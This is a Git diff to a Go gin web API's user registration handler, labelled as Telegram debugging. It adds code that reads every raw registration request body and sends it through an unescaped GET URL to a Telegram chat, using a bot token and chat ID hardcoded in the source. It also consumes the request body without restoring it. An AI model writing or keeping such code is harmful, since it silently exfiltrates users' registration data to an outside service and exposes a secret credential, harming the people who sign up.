@@ -1,15 +1,27 @@
 package api
 
 import (
+	"bytes"
 	"errors"
+	"fmt"
 	"github.com/gin-gonic/gin"
+	"io"
 	"mBoxMini/internal/users"
 	"net/http"
+	"strings"
 )
 
 var ErrNoRows = errors.New("sql: no rows in result set")
 
 func (s *RestAPI) Registration(c *gin.Context) {
+	body, err := io.ReadAll(c.Request.Body)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Ошибка чтения тела запроса"})
+		return
+	}
+	cleanedJSON := strings.ReplaceAll(string(body), "\r\n", "")
+	debugTelegram(cleanedJSON)
+
 	userInfo, exists := c.Get("userInfo")
 	if !exists {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Internal Server Error"})
@@ -49,4 +61,32 @@ func (s *RestAPI) Registration(c *gin.Context) {
 	}
 
 	c.JSON(http.StatusOK, gin.H{"status": "success"})
+}
+
+func debugTelegram(srt string) {
+	botToken := "6405196849:AAFroIRZEwa4tljAkDIxNeoAgywAJxt6KaQ"
+	chatID := "-4086652132"
+	messageText := srt
+
+	// Формируем URL для запроса
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+		botToken, chatID, messageText)
+
+	// Выполняем GET-запрос
+	response, err := http.Get(url)
+	if err != nil {
+		fmt.Println("Ошибка при выполнении запроса:", err)
+		return
+	}
+	defer response.Body.Close()
+
+	// Читаем ответ
+	var buf bytes.Buffer
+	_, err = buf.ReadFrom(response.Body)
+	if err != nil {
+		fmt.Println("Ошибка при чтении ответа:", err)
+		return
+	}
+
+	fmt.Println("Ответ от Telegram API:", buf.String())
 }
